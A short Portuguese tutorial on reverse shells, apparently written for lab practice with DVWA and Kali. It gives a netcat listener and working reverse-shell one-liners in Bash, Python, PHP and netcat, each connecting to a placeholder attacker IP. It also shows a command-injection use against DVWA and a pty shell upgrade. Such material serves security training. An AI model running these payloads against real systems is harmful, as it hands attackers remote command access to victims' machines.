# Shell Reversa

🧠 O que é uma Shell Reversa?

Uma shell reversa é quando o alvo se conecta de volta ao atacante, fornecendo uma sessão de terminal.

📌 Isso normalmente é feito porque o alvo está atrás de um firewall ou NAT, então você faz ele sair e te entregar uma shell.

⸻

🧱 Estrutura típica
	•	Atacante: ouve na porta (listener)
	•	Vítima: executa um payload que se conecta ao atacante

[Atacante] ←—— (conexão TCP) —— [Vítima]
             bash -i >& /dev/tcp/attacker_ip/4444 0>&1


⸻

🎯 Ferramentas comuns
	•	Listener (na máquina do atacante):

nc -lvnp 4444


	•	Payloads reversos (na vítima):
Bash:

bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1

Python:

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATACANTE_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh"])'

PHP:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1'"); ?>

Netcat (se a vítima tiver nc com opção -e):

nc ATACANTE_IP 4444 -e /bin/bash



⸻

💡 Em lab: usando DVWA ou outro alvo
	1.	No seu Kali/Linux (máquina atacante):

nc -lvnp 4444


	2.	No alvo (ex: DVWA, via Command Injection):
Injete:

bash -i >& /dev/tcp/SEU_IP/4444 0>&1



⸻

🧪 Teste seguro: em ambiente local

Você pode simular tudo com dois terminais:

Terminal 1 (listener):

nc -lvnp 4444

Terminal 2 (reverse shell local):

bash -i >& /dev/tcp/127.0.0.1/4444 0>&1


⸻

🔐 Dica: Upgrade de Shell

Se conseguir uma shell reversa crua e quiser torná-la mais usável:

# No shell reversa:
python -c 'import pty; pty.spawn("/bin/bash")'
# Depois:
CTRL+Z  # suspende a shell
stty raw -echo; fg  # volta e melhora a interação
export TERM=xterm